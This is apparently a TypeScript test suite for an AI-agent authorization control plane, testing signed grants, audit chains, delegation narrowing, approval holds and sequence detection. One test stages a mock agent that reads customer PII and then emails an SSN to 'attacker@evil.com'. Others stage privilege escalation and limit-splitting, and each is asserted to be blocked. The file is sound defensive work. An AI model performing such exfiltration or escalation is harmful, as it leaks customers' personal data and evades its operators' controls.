/**
 * Chronicle Comprehensive Test Suite
 * Automated verification of Cryptography, Delegation Narrowing,
 * Sequence Anomaly Detection, Policy Evaluation, Audit Merkle Chains, and Blast Radius.
 */

import assert from 'node:assert';
import {
  generateEd25519KeyPair,
  canonicalJsonStringify,
  canonicalHash,
  signEd25519,
  verifyEd25519,
  createAuthorizationGrant,
  verifyAuthorizationGrant,
  computeReceiptHash,
  verifyReceiptChain
} from '@chronicle/crypto-primitives';
import { DelegationManager } from '@chronicle/delegation-manager';
import { SequenceDetector } from '@chronicle/sequence-detector';
import { PolicyEngine } from '@chronicle/policy-engine';
import { AuditLedger } from '@chronicle/audit-ledger';
import { BlastRadiusAnalyzer } from '@chronicle/blast-radius';
import {
  parsePolicyDSL,
  evaluatePolicyDSL,
  runPolicyTests,
  analyzePolicyCoverage
} from '@chronicle/policy-dsl';
import { ChronicleControlPlane } from '../apps/control-plane/src/index.ts';
import type { ActionRequest, AuthorizationReceipt, PolicyTestCase } from '@chronicle/core-types';

let passedTests = 0;
let totalTests = 0;

async function it(name: string, fn: () => void | Promise<void>) {
  totalTests++;
  try {
    const res = fn();
    if (res instanceof Promise) {
      await res;
    }
    passedTests++;
    console.log(`  \x1b[32m✔\x1b[0m ${name}`);
  } catch (err: unknown) {
    console.error(`  \x1b[31m✖\x1b[0m ${name}`);
    console.error(`    ${(err as Error).message}`);
    throw err;
  }
}

async function runTestSuite() {
  console.log('\n\x1b[1m\x1b[36m=== CHRONICLE CORE INTEGRATION & UNIT TEST SUITE ===\x1b[0m\n');

  console.log('\x1b[1m1. Cryptographic Primitives & Canonical Hashing\x1b[0m');

  it('generates valid Ed25519 keypairs', () => {
    const { publicKey, privateKey } = generateEd25519KeyPair();
    assert(publicKey.includes('BEGIN PUBLIC KEY'));
    assert(privateKey.includes('BEGIN PRIVATE KEY'));
  });

  it('produces deterministic canonical JSON stringification regardless of object key order', () => {
    const objA = { zebra: 1, apple: 'pie', nested: { beta: 2, alpha: 1 } };
    const objB = { apple: 'pie', nested: { alpha: 1, beta: 2 }, zebra: 1 };
    const strA = canonicalJsonStringify(objA);
    const strB = canonicalJsonStringify(objB);
    assert.strictEqual(strA, strB);
    assert.strictEqual(strA, '{"apple":"pie","nested":{"alpha":1,"beta":2},"zebra":1}');
  });

  it('computes identical canonical SHA-256 parameter hashes for semantically identical payloads', () => {
    const p1 = { chargeId: 'ch_123', amount: 50.00, currency: 'USD' };
    const p2 = { currency: 'USD', amount: 50.00, chargeId: 'ch_123' };
    const h1 = canonicalHash(p1);
    const h2 = canonicalHash(p2);
    assert.strictEqual(h1, h2);
    assert(h1.startsWith('sha256:'));
  });

  it('signs and verifies Ed25519 messages successfully', () => {
    const { publicKey, privateKey } = generateEd25519KeyPair();
    const message = 'CHRONICLE_TEST_PAYLOAD';
    const sig = signEd25519(message, privateKey);
    assert(verifyEd25519(message, sig, publicKey));
    assert(!verifyEd25519('TAMPERED_PAYLOAD', sig, publicKey));
  });

  it('creates and verifies cryptographically signed single-use Authorization Grants', () => {
    const { publicKey, privateKey } = generateEd25519KeyPair();
    const params = { chargeId: 'ch_999', amount: 250 };
    const grant = createAuthorizationGrant(
      'grant_test_1',
      'act_test_1',
      'tenant_test',
      'agent_1',
      'stripe_refund',
      'stripe_refund',
      'res_charge_999',
      canonicalHash(params),
      'del_1',
      privateKey,
      60
    );

    // Valid check
    const check1 = verifyAuthorizationGrant(grant, 'stripe_refund', params, publicKey);
    assert.strictEqual(check1.valid, true);

    // Parameter tampering check (TOCTOU defense)
    const tamperedParams = { chargeId: 'ch_999', amount: 250000 };
    const checkTampered = verifyAuthorizationGrant(grant, 'stripe_refund', tamperedParams, publicKey);
    assert.strictEqual(checkTampered.valid, false);
    assert.strictEqual(checkTampered.reason, 'PARAMETERS_TAMPERED: hash mismatch');

    // Tool mismatch check
    const checkWrongTool = verifyAuthorizationGrant(grant, 'send_wire_transfer', params, publicKey);
    assert.strictEqual(checkWrongTool.valid, false);
  });

  it('verifies Merkle-chained receipts and detects middle-chain tampering', () => {
    const { publicKey, privateKey } = generateEd25519KeyPair();
    const receipts: AuthorizationReceipt[] = [];
    let prevHash = 'GENESIS_BLOCK_HASH';

    for (let i = 0; i < 5; i++) {
      const data = {
        receiptId: `rcpt_${i}`,
        actionId: `act_${i}`,
        tenantId: 'tenant_acme',
        agentId: 'agent_finance',
        sponsorId: 'user_sponsor',
        decision: 'ALLOW' as const,
        actionType: 'stripe_refund',
        resourceId: `res_${i}`,
        policyVersion: 'v1.0',
        riskScore: 25,
        reasonCodes: ['POLICY_PERMIT' as const],
        explanation: 'Permitted',
        parametersHash: 'sha256:abc',
        previousReceiptHash: prevHash,
        timestamp: new Date().toISOString()
      };
      const rHash = computeReceiptHash(data, prevHash);
      const sig = signEd25519(rHash, privateKey);
      receipts.push({ ...data, receiptHash: rHash, signature: sig });
      prevHash = rHash;
    }

    // Unmodified chain must pass
    const checkValid = verifyReceiptChain(receipts, publicKey);
    assert.strictEqual(checkValid.valid, true);

    // Tamper with receipt index 2
    receipts[2].decision = 'DENY';
    const checkTampered = verifyReceiptChain(receipts, publicKey);
    assert.strictEqual(checkTampered.valid, false);
    assert(checkTampered.brokenAt?.includes('rcpt_2'));
  });

  console.log('\n\x1b[1m2. Delegation Manager & Monotonic Privilege Narrowing\x1b[0m');

  it('enforces monotonic narrowing between parent and child delegations', () => {
    const dm = new DelegationManager();
    const sponsorKeys = generateEd25519KeyPair();
    const sponsor = {
      userId: 'user_alice',
      tenantId: 'tenant_acme',
      name: 'Alice',
      email: 'alice@acme.com',
      role: 'Director',
      department: 'Finance',
      publicKey: sponsorKeys.publicKey,
      createdAt: new Date().toISOString()
    };
    dm.registerSponsor(sponsor);

    const agentAKeys = generateEd25519KeyPair();
    const agentA = {
      agentId: 'agent_lead',
      tenantId: 'tenant_acme',
      name: 'Lead Agent',
      agentType: 'FINANCE',
      agentVersion: 'v1.0',
      modelProvider: 'claude',
      owner: sponsor.userId,
      sponsor: sponsor.userId,
      creationTime: new Date().toISOString(),
      status: 'ACTIVE' as const,
      environment: 'production' as const,
      riskClass: 'HIGH' as const,
      allowedCapabilities: ['stripe_refund', 'search_customers'],
      publicKey: agentAKeys.publicKey
    };
    dm.registerAgent(agentA);

    const agentBKeys = generateEd25519KeyPair();
    const agentB = {
      agentId: 'agent_subordinate',
      tenantId: 'tenant_acme',
      name: 'Subordinate Agent',
      agentType: 'HELPER',
      agentVersion: 'v1.0',
      modelProvider: 'gpt',
      owner: sponsor.userId,
      sponsor: sponsor.userId,
      creationTime: new Date().toISOString(),
      status: 'ACTIVE' as const,
      environment: 'production' as const,
      riskClass: 'MEDIUM' as const,
      allowedCapabilities: ['stripe_refund'],
      publicKey: agentBKeys.publicKey
    };
    dm.registerAgent(agentB);

    // Parent delegation: max $1,000, allowedTools: ['stripe_refund', 'search_customers']
    const parentDel = dm.createDelegation({
      delegationId: 'del_parent',
      tenantId: 'tenant_acme',
      delegatorType: 'HUMAN',
      delegatorId: sponsor.userId,
      delegateeId: agentA.agentId,
      taskId: 'task_lead',
      purpose: 'Lead operations',
      constraints: {
        allowedTools: ['stripe_refund', 'search_customers'],
        resourcePatterns: ['*'],
        maxTransactionValue: 1000,
        cumulativeValueLimit: 5000
      },
      notBefore: new Date(Date.now() - 10000).toISOString(),
      expiresAt: new Date(Date.now() + 86400000).toISOString()
    }, sponsorKeys.privateKey);

    assert(parentDel);

    // Valid child delegation (narrower: max $500, tool: ['stripe_refund'] only)
    const validChild = dm.createDelegation({
      delegationId: 'del_child_valid',
      tenantId: 'tenant_acme',
      parentDelegationId: 'del_parent',
      delegatorType: 'AGENT',
      delegatorId: agentA.agentId,
      delegateeId: agentB.agentId,
      taskId: 'task_sub',
      purpose: 'Sub-task operations',
      constraints: {
        allowedTools: ['stripe_refund'],
        resourcePatterns: ['*'],
        maxTransactionValue: 500,
        cumulativeValueLimit: 2000
      },
      notBefore: new Date(Date.now() - 5000).toISOString(),
      expiresAt: new Date(Date.now() + 40000000).toISOString()
    }, agentAKeys.privateKey);

    assert(validChild);

    // Invalid child delegation (tries to expand tools to send_wire_transfer)
    assert.throws(() => {
      dm.createDelegation({
        delegationId: 'del_child_invalid_tool',
        tenantId: 'tenant_acme',
        parentDelegationId: 'del_parent',
        delegatorType: 'AGENT',
        delegatorId: agentA.agentId,
        delegateeId: agentB.agentId,
        taskId: 'task_sub',
        purpose: 'Privilege escalation attempt',
        constraints: {
          allowedTools: ['send_wire_transfer'], // Unauthorized tool!
          resourcePatterns: ['*'],
          maxTransactionValue: 500
        },
        notBefore: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 40000000).toISOString()
      }, agentAKeys.privateKey);
    }, /Monotonic narrowing violation/);

    // Invalid child delegation (tries to expand maxTransactionValue to $5,000)
    assert.throws(() => {
      dm.createDelegation({
        delegationId: 'del_child_invalid_value',
        tenantId: 'tenant_acme',
        parentDelegationId: 'del_parent',
        delegatorType: 'AGENT',
        delegatorId: agentA.agentId,
        delegateeId: agentB.agentId,
        taskId: 'task_sub',
        purpose: 'Limit escalation attempt',
        constraints: {
          allowedTools: ['stripe_refund'],
          resourcePatterns: ['*'],
          maxTransactionValue: 5000 // Exceeds parent 1000!
        },
        notBefore: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 40000000).toISOString()
      }, agentAKeys.privateKey);
    }, /Monotonic narrowing violation/);
  });

  it('cascades delegation revocation to all descendants', () => {
    const dm = new DelegationManager();
    const keys = generateEd25519KeyPair();
    const sponsor = {
      userId: 'user_bob',
      tenantId: 't1',
      name: 'Bob',
      email: 'bob@t1.com',
      role: 'Manager',
      department: 'Ops',
      publicKey: keys.publicKey,
      createdAt: new Date().toISOString()
    };
    dm.registerSponsor(sponsor);

    const agA = {
      agentId: 'agA',
      tenantId: 't1',
      name: 'A',
      agentType: 'OPS',
      agentVersion: '1',
      modelProvider: 'gpt',
      owner: sponsor.userId,
      sponsor: sponsor.userId,
      creationTime: new Date().toISOString(),
      status: 'ACTIVE' as const,
      environment: 'production' as const,
      riskClass: 'LOW' as const,
      allowedCapabilities: ['*'],
      publicKey: keys.publicKey
    };
    dm.registerAgent(agA);

    dm.createDelegation({
      delegationId: 'd_root',
      tenantId: 't1',
      delegatorType: 'HUMAN',
      delegatorId: sponsor.userId,
      delegateeId: agA.agentId,
      taskId: 't_root',
      purpose: 'root',
      constraints: { allowedTools: ['*'], resourcePatterns: ['*'] },
      notBefore: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 100000).toISOString()
    }, keys.privateKey);

    dm.createDelegation({
      delegationId: 'd_sub1',
      parentDelegationId: 'd_root',
      tenantId: 't1',
      delegatorType: 'AGENT',
      delegatorId: agA.agentId,
      delegateeId: agA.agentId,
      taskId: 't_sub1',
      purpose: 'sub1',
      constraints: { allowedTools: ['*'], resourcePatterns: ['*'] },
      notBefore: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 50000).toISOString()
    }, keys.privateKey);

    const revResult = dm.revokeDelegation('d_root', 'Emergency audit revocation');
    assert.strictEqual(revResult.revokedCount, 2);

    const chainCheck = dm.verifyDelegationChain('d_sub1', agA.agentId);
    assert.strictEqual(chainCheck.valid, false);
    assert.strictEqual(chainCheck.reasonCode, 'DELEGATION_REVOKED');
  });

  console.log('\n\x1b[1m3. Sequence Detector & Behavioral Invariant Monitoring\x1b[0m');

  it('detects forbidden data exfiltration sequence (PII read followed by outbound email)', () => {
    const sd = new SequenceDetector();
    const sessId = 'sess_attack_1';
    const taskId = 'task_support';

    // Step 1: Agent reads customer PII
    sd.recordAction({
      actionId: 'act_1',
      sessionId: sessId,
      taskId,
      agentId: 'agent_support',
      actionType: 'read_customer_pii',
      tool: 'read_customer_pii',
      resourceId: 'cust_001',
      parameters: { customerId: 'cust_001' },
      decision: 'ALLOW',
      timestamp: new Date().toISOString()
    });

    // Step 2: Agent attempts to call outbound email tool
    const req: ActionRequest = {
      actionId: 'act_2',
      tenantId: 'tenant_acme',
      sessionId: sessId,
      taskId,
      agentId: 'agent_support',
      delegationId: 'del_test',
      actionType: 'send_external_email',
      tool: 'send_external_email',
      resource: { id: 'msg_001', type: 'email', sensitivity: 'CONFIDENTIAL', environment: 'production' },
      parameters: { to: 'attacker@evil.com', body: 'Customer SSN is ...' },
      parametersHash: 'sha256:test',
      timestamp: new Date().toISOString()
    };

    const evalResult = sd.evaluateSequence(req);
    assert.strictEqual(evalResult.valid, false);
    assert.strictEqual(evalResult.reasonCode, 'FORBIDDEN_SEQUENCE');
    assert(evalResult.explanation?.includes('Forbidden sequence detected'));
  });

  it('enforces mandatory prerequisite sequences for high-risk actions', () => {
    const sd = new SequenceDetector();
    const req: ActionRequest = {
      actionId: 'act_wire',
      tenantId: 'tenant_acme',
      sessionId: 'sess_wire',
      taskId: 'task_wire',
      agentId: 'agent_finance',
      delegationId: 'del_finance',
      actionType: 'send_wire_transfer',
      tool: 'send_wire_transfer',
      resource: { id: 'wire_001', type: 'wire', sensitivity: 'CRITICAL', environment: 'production' },
      parameters: { amount: 500 },
      parametersHash: 'sha256:wire',
      timestamp: new Date().toISOString()
    };

    // Attempt wire without prior verify_identity
    const noPrereq = sd.evaluateSequence(req);
    assert.strictEqual(noPrereq.valid, false);
    assert.strictEqual(noPrereq.reasonCode, 'MISSING_PREREQUISITE_SEQUENCE');

    // Add prerequisite to history
    sd.recordAction({
      actionId: 'act_verify',
      sessionId: 'sess_wire',
      taskId: 'task_wire',
      agentId: 'agent_finance',
      actionType: 'verify_identity',
      tool: 'verify_identity',
      resourceId: 'res_auth',
      parameters: { status: 'VERIFIED' },
      decision: 'ALLOW',
      timestamp: new Date().toISOString()
    });

    const withPrereq = sd.evaluateSequence(req);
    assert.strictEqual(withPrereq.valid, true);
  });

  it('detects cumulative transaction limit evasion (Smurfing defense)', () => {
    const sd = new SequenceDetector();
    const sessId = 'sess_smurf';
    const taskId = 'task_smurf';

    const delegation = {
      delegationId: 'del_smurf',
      tenantId: 'tenant_acme',
      delegatorType: 'HUMAN' as const,
      delegatorId: 'user_sponsor',
      delegateeId: 'agent_smurf',
      taskId,
      purpose: 'smurf test',
      constraints: {
        allowedTools: ['stripe_refund'],
        resourcePatterns: ['*'],
        maxTransactionValue: 1000,
        cumulativeValueLimit: 2500
      },
      notBefore: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 100000).toISOString(),
      revoked: false,
      signature: '',
      createdAt: new Date().toISOString()
    };

    // Record two transactions of $900 ($1,800 cumulative)
    sd.recordAction({
      actionId: 'act_1',
      sessionId: sessId,
      taskId,
      agentId: 'agent_smurf',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resourceId: 'r1',
      parameters: { amount: 900 },
      decision: 'ALLOW',
      timestamp: new Date().toISOString()
    });
    sd.recordAction({
      actionId: 'act_2',
      sessionId: sessId,
      taskId,
      agentId: 'agent_smurf',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resourceId: 'r2',
      parameters: { amount: 900 },
      decision: 'ALLOW',
      timestamp: new Date().toISOString()
    });

    // Third transaction of $800 ($1,800 + $800 = $2,600 > $2,500 cumulative limit!)
    const req: ActionRequest = {
      actionId: 'act_3',
      tenantId: 'tenant_acme',
      sessionId: sessId,
      taskId,
      agentId: 'agent_smurf',
      delegationId: 'del_smurf',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resource: { id: 'r3', type: 'refund', sensitivity: 'HIGH', environment: 'production' },
      parameters: { amount: 800 },
      parametersHash: 'sha256:smurf',
      timestamp: new Date().toISOString()
    };

    const smurfCheck = sd.evaluateSequence(req, undefined, delegation);
    assert.strictEqual(smurfCheck.valid, false);
    assert.strictEqual(smurfCheck.reasonCode, 'CUMULATIVE_LIMIT_EXCEEDED');
  });

  console.log('\n\x1b[1m4. Full Control Plane Authorization Pipeline\x1b[0m');

  await it('processes authorized action, signs grant, and appends to Merkle audit ledger', async () => {
    const cp = new ChronicleControlPlane();

    const request: ActionRequest = {
      actionId: 'act_normal_refund',
      tenantId: 'tenant_acme',
      sessionId: 'sess_normal',
      taskId: 'task_customer_refunds',
      agentId: 'agent_finance_refund',
      delegationId: 'del_finance_refund_root',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resource: {
        id: 'charge_8812',
        type: 'charge',
        sensitivity: 'HIGH',
        environment: 'production'
      },
      parameters: { chargeId: 'ch_8812', amount: 450 },
      parametersHash: canonicalHash({ chargeId: 'ch_8812', amount: 450 }),
      timestamp: new Date().toISOString()
    };

    const decision = await cp.authorizeAction(request);
    assert.strictEqual(decision.decision, 'ALLOW');
    assert(decision.grant);
    assert.strictEqual(decision.grant.actionId, request.actionId);
    assert(decision.receipt);
    assert.strictEqual(decision.receipt.decision, 'ALLOW');

    // Audit ledger integrity must be unbroken
    const ledgerCheck = cp.auditLedger.verifyIntegrity();
    assert.strictEqual(ledgerCheck.valid, true);
    assert.strictEqual(ledgerCheck.totalReceipts, 1);
  });

  await it('triggers Step-Up HOLD for high-value transactions above approval threshold', async () => {
    const cp = new ChronicleControlPlane();

    const highValueReq: ActionRequest = {
      actionId: 'act_high_value',
      tenantId: 'tenant_acme',
      sessionId: 'sess_high',
      taskId: 'task_customer_refunds',
      agentId: 'agent_finance_refund',
      delegationId: 'del_finance_refund_root',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resource: {
        id: 'charge_vip',
        type: 'charge',
        sensitivity: 'HIGH',
        environment: 'production'
      },
      parameters: { chargeId: 'ch_vip', amount: 1500 }, // > $1000 threshold
      parametersHash: canonicalHash({ chargeId: 'ch_vip', amount: 1500 }),
      timestamp: new Date().toISOString()
    };

    const decision = await cp.authorizeAction(highValueReq);
    assert.strictEqual(decision.decision, 'HOLD');
    assert.strictEqual(decision.reasonCodes[0], 'MISSING_REQUIRED_APPROVAL');
    assert(decision.approvalId);

    // Verify it appears in pending approvals list
    const pending = cp.getPendingApprovals();
    assert.strictEqual(pending.length, 1);
    assert.strictEqual(pending[0].approvalId, decision.approvalId);

    // Human Sponsor signs off on the approval
    const decided = cp.decideApproval(decision.approvalId, true, 'user_ciso_jane', 'Approved VIP refund');
    assert(decided);
    assert.strictEqual(decided.approval.status, 'APPROVED');
    assert(decided.grant);
  });

  await it('instantly enforces emergency agent quarantine and global kill switch', async () => {
    const cp = new ChronicleControlPlane();

    const normalReq: ActionRequest = {
      actionId: 'act_quarantine_test',
      tenantId: 'tenant_acme',
      sessionId: 'sess_q',
      taskId: 'task_customer_refunds',
      agentId: 'agent_finance_refund',
      delegationId: 'del_finance_refund_root',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resource: { id: 'charge_1', type: 'charge', sensitivity: 'HIGH', environment: 'production' },
      parameters: { amount: 100 },
      parametersHash: canonicalHash({ amount: 100 }),
      timestamp: new Date().toISOString()
    };

    // Quarantine the agent
    cp.policyEngine.quarantineAgent('agent_finance_refund');
    const qDecision = await cp.authorizeAction(normalReq);
    assert.strictEqual(qDecision.decision, 'DENY');
    assert.strictEqual(qDecision.reasonCodes[0], 'AGENT_QUARANTINED');

    // Unquarantine and engage master kill switch
    cp.policyEngine.unquarantineAgent('agent_finance_refund');
    cp.policyEngine.setKillSwitch(true);

    const ksDecision = await cp.authorizeAction(normalReq);
    assert.strictEqual(ksDecision.decision, 'DENY');
    assert.strictEqual(ksDecision.reasonCodes[0], 'TOOL_LOCKED_DOWN');
  });

  await it('builds full end-to-end cryptographic Provenance Graph and Blast Radius Report', async () => {
    const cp = new ChronicleControlPlane();

    const req: ActionRequest = {
      actionId: 'act_provenance_test',
      tenantId: 'tenant_acme',
      sessionId: 'sess_p',
      taskId: 'task_customer_refunds',
      agentId: 'agent_finance_refund',
      delegationId: 'del_finance_refund_root',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resource: { id: 'charge_p', type: 'charge', sensitivity: 'HIGH', environment: 'production' },
      parameters: { amount: 100 },
      parametersHash: canonicalHash({ amount: 100 }),
      timestamp: new Date().toISOString()
    };

    await cp.authorizeAction(req);

    // Provenance graph
    const graph = cp.auditLedger.buildProvenanceGraph('act_provenance_test');
    assert(graph);
    assert.strictEqual(graph.actionId, 'act_provenance_test');
    assert(graph.nodes.some(n => n.type === 'HUMAN'));
    assert(graph.nodes.some(n => n.type === 'AGENT'));
    assert(graph.nodes.some(n => n.type === 'RECEIPT'));

    // Blast radius report
    const blast = cp.blastRadiusAnalyzer.calculateBlastRadius('agent_finance_refund');
    assert(blast);
    assert.strictEqual(blast.agentId, 'agent_finance_refund');
    assert.strictEqual(blast.maximumFinancialExposure, 10000);
    assert(blast.reachableTools.some(t => t.tool === 'stripe_refund'));
  });

  console.log('\n\x1b[1m5. Workflow State Machine & Business Invariants (§41, §42, §43, §44)\x1b[0m');

  await it('enforces state-aware gating and event-aware transitions in formal workflows', async () => {
    const cp = new ChronicleControlPlane();
    const wfEngine = cp.policyEngine.getWorkflowEngine();

    wfEngine.registerWorkflow({
      workflowId: 'wf_support_approval',
      tenantId: 'tenant_acme',
      name: 'Support Approval Workflow',
      description: 'Ticket -> Investigation -> Approved -> Executed',
      initialState: 'INVESTIGATING',
      terminalStates: ['EXECUTED', 'CLOSED'],
      states: ['INVESTIGATING', 'APPROVED', 'EXECUTED', 'CLOSED'],
      transitions: [
        { fromState: 'INVESTIGATING', toState: 'APPROVED', triggerEvent: 'fraud_check_passed' },
        { fromState: 'APPROVED', toState: 'EXECUTED' }
      ],
      actionStateRequirements: {
        stripe_refund: ['APPROVED']
      }
    });

    const inst = wfEngine.createInstance('wf_support_approval', 'tenant_acme', 'task_wf_test');

    const wfReq: ActionRequest = {
      actionId: 'act_wf_gate_test',
      tenantId: 'tenant_acme',
      sessionId: 'sess_wf',
      taskId: 'task_wf_test',
      agentId: 'agent_finance_refund',
      delegationId: 'del_finance_refund_root',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resource: { id: 'charge_wf', type: 'charge', sensitivity: 'CONFIDENTIAL', environment: 'production' },
      parameters: { chargeId: 'charge_wf', amount: 50, originalAmount: 500 },
      parametersHash: canonicalHash({ chargeId: 'charge_wf', amount: 50, originalAmount: 500 }),
      timestamp: new Date().toISOString()
    };

    // 1. In INVESTIGATING state, stripe_refund must be DENIED with WORKFLOW_STATE_INVALID (§43)
    const earlyDecision = await cp.authorizeAction(wfReq);
    assert.strictEqual(earlyDecision.decision, 'DENY');
    assert.strictEqual(earlyDecision.reasonCodes[0], 'WORKFLOW_STATE_INVALID');

    // 2. Transition without event fails (§44)
    assert.throws(() => {
      wfEngine.transition(inst.instanceId, 'APPROVED', 'user_finance');
    }, /required prerequisite event 'fraud_check_passed'/);

    // 3. Emit event and transition
    wfEngine.emitEvent(inst.instanceId, 'fraud_check_passed');
    wfEngine.transition(inst.instanceId, 'APPROVED', 'user_finance');

    // 4. In APPROVED state, action is permitted
    const approvedDecision = await cp.authorizeAction(wfReq);
    assert.strictEqual(approvedDecision.decision, 'ALLOW');
  });

  await it('evaluates and enforces business invariants deterministically (§41)', async () => {
    const cp = new ChronicleControlPlane();

    // Invariant: Refund exceeding original payment
    const exceedReq: ActionRequest = {
      actionId: 'act_inv_exceed',
      tenantId: 'tenant_acme',
      sessionId: 'sess_inv',
      taskId: 'task_customer_refunds',
      agentId: 'agent_finance_refund',
      delegationId: 'del_finance_refund_root',
      actionType: 'stripe_refund',
      tool: 'stripe_refund',
      resource: { id: 'charge_inv_1', type: 'charge', sensitivity: 'CONFIDENTIAL', environment: 'production' },
      parameters: { chargeId: 'charge_inv_1', amount: 4500, originalAmount: 1000 },
      parametersHash: canonicalHash({ chargeId: 'charge_inv_1', amount: 4500, originalAmount: 1000 }),
      timestamp: new Date().toISOString()
    };

    const exceedDecision = await cp.authorizeAction(exceedReq);
    assert.strictEqual(exceedDecision.decision, 'DENY');
    assert.strictEqual(exceedDecision.reasonCodes[0], 'INVARIANT_VIOLATION');
    assert(exceedDecision.explanation.includes('exceeds original payment amount'));
  });

  console.log('\n\x1b[1m6. Declarative Policy DSL & AST Test Runner (§22, §50, §51, §52, §53)\x1b[0m');

  await it('parses human-readable Policy DSL and compiles to AST (§22, §50)', () => {
    const dsl = `
      POLICY enterprise_refund_guard
      ALLOW stripe_refund
      WHEN amount <= 5000
        AND resource.sensitivity IN ["INTERNAL", "CONFIDENTIAL"]
      REQUIRE_APPROVAL_ABOVE 2500
    `;
    const ast = parsePolicyDSL(dsl);
    assert.strictEqual(ast.policyId, 'enterprise_refund_guard');
    assert.strictEqual(ast.targetAction, 'stripe_refund');
    assert.strictEqual(ast.effect, 'ALLOW');
    assert.strictEqual(ast.conditions.length, 2);
    assert.strictEqual(ast.requireApprovalAbove, 2500);
  });

  await it('evaluates compiled Policy AST and executes policy test runner (§51)', () => {
    const dsl = `
      POLICY test_runner_policy
      ALLOW stripe_refund
      WHEN amount <= 5000
      REQUIRE_APPROVAL_ABOVE 2500
    `;
    const ast = parsePolicyDSL(dsl);

    const testCases: PolicyTestCase[] = [
      {
        testId: 't1',
        name: 'Auto-allow sub-2500',
        policyId: ast.policyId,
        mockAction: {
          actionId: 'act_t1',
          tenantId: 'tenant_acme',
          sessionId: 's',
          taskId: 't',
          agentId: 'a',
          delegationId: 'd',
          actionType: 'refund',
          tool: 'stripe_refund',
          resource: { id: 'c1', type: 'charge', sensitivity: 'INTERNAL', environment: 'production' },
          parameters: { amount: 1000 },
          parametersHash: 'sha256:dummy',
          timestamp: new Date().toISOString()
        },
        mockContext: {} as any,
        expectedDecision: 'ALLOW'
      },
      {
        testId: 't2',
        name: 'Step-up hold above 2500',
        policyId: ast.policyId,
        mockAction: {
          actionId: 'act_t2',
          tenantId: 'tenant_acme',
          sessionId: 's',
          taskId: 't',
          agentId: 'a',
          delegationId: 'd',
          actionType: 'refund',
          tool: 'stripe_refund',
          resource: { id: 'c2', type: 'charge', sensitivity: 'INTERNAL', environment: 'production' },
          parameters: { amount: 3000 },
          parametersHash: 'sha256:dummy',
          timestamp: new Date().toISOString()
        },
        mockContext: {} as any,
        expectedDecision: 'HOLD'
      }
    ];

    const report = runPolicyTests(ast, testCases);
    assert.strictEqual(report.totalTests, 2);
    assert.strictEqual(report.passed, 2);
  });

  console.log(`\n\x1b[32m\x1b[1mALL ${passedTests}/${totalTests} TESTS PASSED CLEANLY!\x1b[0m\n`);
}

runTestSuite().catch(err => {
  console.error('\nTest suite failed:', err);
  process.exit(1);
});
